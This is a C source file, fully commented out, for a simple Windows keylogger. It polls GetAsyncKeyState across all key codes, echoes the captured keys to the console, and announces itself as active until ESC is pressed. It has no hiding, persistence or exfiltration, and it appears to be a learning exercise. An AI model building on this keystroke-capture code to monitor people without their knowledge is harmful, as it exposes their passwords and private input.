// #include "keyloger.h"

// int	handleKeyPress(t_key *keyData)
// {
// 	 for (int key = 8; key <= 255; key++)
// 		{
// 			SHORT currentState = GetAsyncKeyState(key);
// 			BOOL isPressed = (currentState & 0x8000) != 0;

// 			if (isPressed && !keyData->keyStates[key])
// 			{
// 				keyData->keyPressTime[key] = keyData->currentTime;
// 				keyData->lastRepeatTime[key] = keyData->currentTime;
// 				if (key == VK_ESCAPE)
// 					return 0;
// 				if (key == VK_RETURN)
// 					printf("\n");
// 				else if (key >= 32 && key <= 126)
// 				{
// 					if (keyData->isCapsLockOn)
// 						printf("%c", key);
// 					else
// 						printf("%c", key + 32);
// 				}
// 				else if (key == VK_SPACE)
// 					printf(" ");
// 				else if (key == VK_BACK)
// 					printf("[BACKSPACE]");
// 				else if (key == VK_CAPITAL)
// 				{
// 					keyData->isCapsLockOn = !keyData->isCapsLockOn;
// 					printf("[CAPS_LOCK]");
// 				}
// 				else if (key >= VK_F1 && key <= VK_F24)
// 					printf("[F%d]", key - VK_F1 + 1);
// 			}
// 			else if (isPressed && keyData->keyStates[key])
// 			{
// 				// TODO key repeat logic
// 				DWORD sincePressTime = keyData->currentTime - keyData->keyPressTime[key];
// 				DWORD sinceRepeatTime = keyData->currentTime - keyData->lastRepeatTime[key];
// 				if (sincePressTime >= keyData->delayMs && sinceRepeatTime >= keyData->intervalMs)
// 				{
// 					printf("key repeat LOG");
// 					keyData->lastRepeatTime[key] = keyData->currentTime;
// 				}
// 			}
// 			keyData->keyStates[key] = isPressed;
// 		}
// 		Sleep(10);
// 	return 0;
// }

// void	initKeylogger(t_key *keyData)
// {
	
// 	for (size_t i = 0; i < 256; i++)
// 	{
// 		keyData->keyStates[i] = FALSE;
// 		keyData->keyPressTime[i] = 0;
// 		keyData->lastRepeatTime[i] = 0;
// 	}
// 	keyData->isCapsLockOn = FALSE;
// 	keyData->currentTime = GetTickCount();

// 	SystemParametersInfo(SPI_GETKEYBOARDDELAY, 0, &keyData->repeatDelay, 0);
// 	SystemParametersInfo(SPI_GETKEYBOARDSPEED, 0, &keyData->repeatSpeed, 0);
	
// 	keyData->delayMs = (keyData->repeatDelay + 1) * 250;  // 250ms to 1000ms
// 	keyData->intervalMs = 400 - (keyData->repeatSpeed * 12); // ~400ms to ~30ms
	
// 	printf("Repetition delays : %ld ms\n", keyData->delayMs);
// 	printf("Repetition intervals : %ld ms\n", keyData->intervalMs);
// 	printf("Keylogger active ! Press ESC to exit\n\n");
// }
